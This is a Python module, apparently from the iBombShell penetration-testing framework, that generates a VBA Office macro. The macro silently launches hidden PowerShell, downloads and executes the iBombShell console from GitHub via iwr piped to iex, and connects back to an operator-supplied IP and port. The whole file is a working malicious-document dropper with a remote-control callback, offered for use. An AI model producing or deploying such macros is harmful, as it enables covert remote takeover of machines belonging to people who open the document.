from termcolor import colored, cprint
from module import ModuleGenerate
from printib import print_ok, print_info, print_error

class CustomModule(ModuleGenerate):

    def __init__(self):
        information = {"Name": "Generate Macro iBombShell ",
                       "Description": "This module generates a macro to launch iBombShell",
                       "Author": "@josueencinar"}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information)


    # This module must be always implemented, it is called by the run option
    def run_module(self):
        code = ("""Sub launchIBombShell()
     Shell ('powershell.exe -noexit -W Hidden ' & '(iwr -UseBasicParsing -uri "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console").Content | iex; console -Silently -uriConsole http://{}:{}')
End Sub""".format(self.args['ip'], self.args['port']))
        
        self.run(code, "bas")